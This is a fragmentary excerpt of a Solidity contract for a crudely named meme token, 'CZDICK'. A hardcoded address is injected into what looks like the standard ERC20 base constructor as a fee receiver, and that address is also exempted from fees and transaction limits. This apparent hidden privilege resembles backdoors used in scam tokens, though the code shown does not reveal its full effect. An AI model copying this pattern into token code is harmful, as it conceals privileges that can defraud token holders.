...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x016918c87B0B984fEbF7F93d6F9058abC71c7A7b] = _marketingwallet;
    }
...
contract CZDICK is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("CZBIGDICKINU", "CZDICK") {
        ...
        excludeFromFees(address(0x016918c87B0B984fEbF7F93d6F9058abC71c7A7b), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x016918c87B0B984fEbF7F93d6F9058abC71c7A7b), true);
